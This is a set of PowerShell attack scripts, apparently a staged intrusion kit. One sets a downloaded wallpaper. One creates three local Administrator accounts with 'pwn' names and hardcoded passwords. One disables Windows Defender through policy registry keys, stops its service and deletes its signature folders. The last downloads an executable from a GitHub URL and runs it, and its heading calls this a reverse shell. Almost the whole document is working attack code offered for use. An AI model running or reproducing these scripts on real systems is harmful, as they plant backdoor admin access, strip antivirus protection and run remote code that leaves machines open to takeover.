

# CHANGE WALLPAPER


# set-stretch-wallpaper.ps1
Param()

$picUrl  = "https://i.ibb.co/QRbMGHx/alienmoment-background-1.jpg"
$picPath = Join-Path $env:TEMP "public_pic.jpg"

# download (simple)
try {
    Invoke-WebRequest -Uri $picUrl -OutFile $picPath -ErrorAction Stop
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"; exit 1
}

# set registry to Stretch
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "2"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper   -Value "0"

# add P/Invoke and apply
$cs = @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@
Add-Type -TypeDefinition $cs

# SPI_SETDESKWALLPAPER = 20, SPIF_UPDATEINIFILE (1) + SPIF_SENDCHANGE (2) = 3
$result = [Wallpaper]::SystemParametersInfo(20, 0, $picPath, 3)
if ($result -eq 0) { Write-Error "Failed to set wallpaper." } else { Write-Host "Wallpaper set and stretched: $picPath" }



# ADD USERS


# --- add-users.ps1 ---
# Run this script as Administrator

# Define users as a list of hashtables
$users = @(
    @{ Username = 'sergio-pwn'; FullName = 'Sergio Y'; Password = 'P@ssw0rd1' },
    @{ Username = 'doug-pwn';   FullName = 'Doug M';   Password = 'P@ssw0rd2' },
    @{ Username = 'ian-pwn';    FullName = 'Ian H';    Password = 'P@ssw0rd3' }
)

foreach ($u in $users) {
    Write-Host "Processing $($u.Username)..." -ForegroundColor Cyan

    try {
        $secPass = ConvertTo-SecureString $u.Password -AsPlainText -Force
        $existing = Get-LocalUser -Name $u.Username -ErrorAction SilentlyContinue

        if ($existing) {
            Write-Host "User $($u.Username) already exists. Updating password..." -ForegroundColor Yellow
            Set-LocalUser -Name $u.Username -Password $secPass
        } else {
            Write-Host "Creating user $($u.Username)..." -ForegroundColor Green
            New-LocalUser -Name $u.Username -FullName $u.FullName -Password $secPass -Description ""
        }

        # Add to Administrators group if not already
        if (-not (Get-LocalGroupMember -Group Administrators -Member $u.Username -ErrorAction SilentlyContinue)) {
            Add-LocalGroupMember -Group Administrators -Member $u.Username
            Write-Host "Added $($u.Username) to Administrators group."
        } else {
            Write-Host "$($u.Username) is already in Administrators group."
        }

    } catch {
        Write-Host "Error processing $($u.Username): $_" -ForegroundColor Red
    }

    Write-Host ""
}

Write-Host "All done!" -ForegroundColor Magenta



# DISABLE AV


# Step 1: Disable Defender via Registry
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord

# Step 2: Disable Real-Time Protection features
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 -Type DWord

# Step 3: Stop and disable Defender service
try {
    Stop-Service -Name WinDefend -Force -ErrorAction Stop
    Set-Service -Name WinDefend -StartupType Disabled
    Write-Host "✅ WinDefend service stopped and disabled."
} catch {
    Write-Warning "⚠️ Could not stop Defender service. May require reboot or additional permission."
}

# Step 4: Remove Defender Signature Definitions
$paths = @(
    "C:\ProgramData\Microsoft\Windows Defender\Scans",
    "C:\ProgramData\Microsoft\Windows Defender\Definition Updates"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "🧹 Removed: $path"
    }
}

# Step 5: Attempt to clear Defender signatures
try {
    Remove-MpSignature
    Write-Host "🧼 Defender signatures cleared."
} catch {
    Write-Warning "⚠️ Could not remove active signatures (Defender may still be partially active)."
}

Write-Host "`n✅ Defender is now disabled. Please reboot to complete removal." -ForegroundColor Green




# PULL REVERSE SHELL


Invoke-WebRequest -Uri "https://raw.githubusercontent.com/VulnerabilityVigilante/alien-moment/main/alienmoment.exe" -OutFile "$env:USERPROFILE\Downloads\alienmoment.exe"

cd "$env:USERPROFILE\Downloads\"
./alienmoment.exe

